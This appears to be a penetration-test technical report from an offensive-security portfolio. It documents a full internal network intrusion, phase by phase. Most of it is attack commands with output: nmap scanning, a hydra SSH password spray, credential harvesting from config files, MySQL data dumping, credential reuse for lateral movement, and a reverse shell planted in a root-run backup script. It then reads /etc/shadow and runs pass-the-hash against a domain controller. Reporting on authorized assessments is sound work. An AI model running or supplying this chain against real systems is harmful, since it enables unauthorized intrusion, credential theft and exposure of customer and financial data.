# Technical Report


## Phase 1: Network Discovery & Enumeration

### Host Discovery
```bash
# Discover active hosts on the network segment
nmap -sn 192.168.78.0/24

# Results:
# 192.168.78.10 - web-server-01.internal.corp
# 192.168.78.20 - app-server-01.internal.corp  
# 192.168.78.30 - db-server-01.internal.corp
# 192.168.78.40 - dc-01.internal.corp

Service Enumeration
bash

# Comprehensive service scan on all targets
nmap -sS -sV -sC -p- 192.168.78.10,192.168.78.20,192.168.78.30,192.168.78.40

# Key Service Findings:
# web-server-01: SSH (22), HTTP (80)
# app-server-01: SSH (22), RDP (3389) 
# db-server-01: MySQL (3306)
# dc-01: SMB (445), RDP (3389)

```
## Phase 2: Initial Compromise (12 hours)

### SSH Credential Attack
```bash

# Password spray against common service account names
hydra -L /usr/share/wordlists/common_usernames.txt \
      -P /usr/share/wordlists/common_passwords.txt \
      ssh://web-server-01.internal.corp

# Successful credentials found:
# username: svc_webapp
# password: March2025!

# Establish initial access
ssh svc_webapp@web-server-01.internal.corp

Initial Foothold Evidence
bash

# Confirm access and enumerate privileges
whoami
# svc_webapp

hostname  
# web-server-01

# Check user privileges
sudo -l
# User svc_webapp may run the following commands:
#     (ALL) NOPASSWD: /usr/bin/systemctl restart apache2

Evidence Collected: Gained initial foothold via weak SSH credentials with ability to restart web services.

```
## Phase 3: Internal Reconnaissance & Database Access (16 hours)

### Local Enumeration
```bash

# Search for configuration files and credentials
find /home/svc_webapp -type f -name "*.txt" -o -name "*.conf" -o -name "*.config" 2>/dev/null
find /var/www -type f -name "*.php" -o -name "*.config" 2>/dev/null

# Discover database configuration
cat /var/www/html/config/database.php
# Contains: db_user = 'app_dbuser', db_pass = 'DbAdmin123!'

Database Compromise
bash

# Connect to MySQL database
mysql -u app_dbuser -p'DbAdmin123!' -h db-server-01.internal.corp

# Database enumeration
SHOW DATABASES;
USE application_db;
SHOW TABLES;

# Examine user tables and extract credentials
SELECT * FROM users;
SELECT * FROM system_credentials;

# Found domain user credentials:
# username: jsmith, password: Welcome123!

# Discover sensitive business data
SELECT COUNT(*) FROM customer_data;
# 11,717 customer records accessible

SELECT COUNT(*) FROM financial_records;  
# 4,137 financial records accessible

Evidence Collected: Accessed customer database containing 11,717 records and extracted domain user credentials.

```
## Phase 4: Lateral Movement (14 hours)

### Credential Reuse Testing
```bash

# Test discovered credentials on application server
ssh jsmith@app-server-01.internal.corp
# Password: Welcome123! - SUCCESS

# Confirm access and enumerate
whoami
# jsmith

hostname
# app-server-01

Application Server Enumeration
bash

# Check user privileges
sudo -l
# User jsmith may run the following commands:
#     (root) NOPASSWD: /opt/scripts/backup.sh

# Discover backup script with weak permissions  
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx (world writable)

# Analyze script contents
cat /opt/scripts/backup.sh
# Script performs database backups with root privileges

Evidence Collected: Successfully moved laterally using reused credentials and identified privilege escalation vector.

```
## Phase 5: Privilege Escalation (6 hours)

### Privilege Escalation Execution
```bash

# Replace backup script with reverse shell
cat > /opt/scripts/backup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.78.100/4444 0>&1
EOF

# Execute with sudo privileges
sudo /opt/scripts/backup.sh

Root Access Achieved
bash

# Once root access achieved, collect evidence
whoami
# root

# Extract password hashes for further attacks
cat /etc/shadow | grep -v ':\*:' | grep -v ':\!:' 
# Retrieved local administrator hashes

# Discover sensitive system data
find /root -type f -name "*.key" -o -name "*.pem" -o -name "*.cred" 2>/dev/null
ls -la /etc/secrets/

Evidence Collected: Achieved root-level access via privilege escalation and extracted credential hashes.

```
## Phase 6: Domain Compromise (2 hours)

### Pass-the-Hash Attack
```bash

# Using extracted local admin hash
pth-winexe -U administrator//aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 //dc-01.internal.corp cmd

Domain Controller Access
bash

# Confirm administrative access
whoami
# NT AUTHORITY\SYSTEM

# Discover domain-sensitive data
net user administrator
net group "Domain Admins"

# Access critical business data
dir C:\Finance\
dir C:\HR\Confidential\
tree C:\ /F | findstr "password\|secret\|confidential"

Evidence Collected: Gained domain administrator privileges and accessed sensitive financial and HR data repositories.

Complete Attack Chain Summary

```
## 🔍 Quick Navigation

- [Back to Project Hub](https://github.com/Vitor-D-Anjos/offensive-security-portfolio/tree/main/security-assessments/network-penetration-testing/lateral-movement-assessment)
- [Executive Summary](executive-summary.md)
- [Findings & Remediation](findings-remediation.md)
- [Evidence & Documentation](evidence/README.md)
- [Methodology](methodology/README.md)
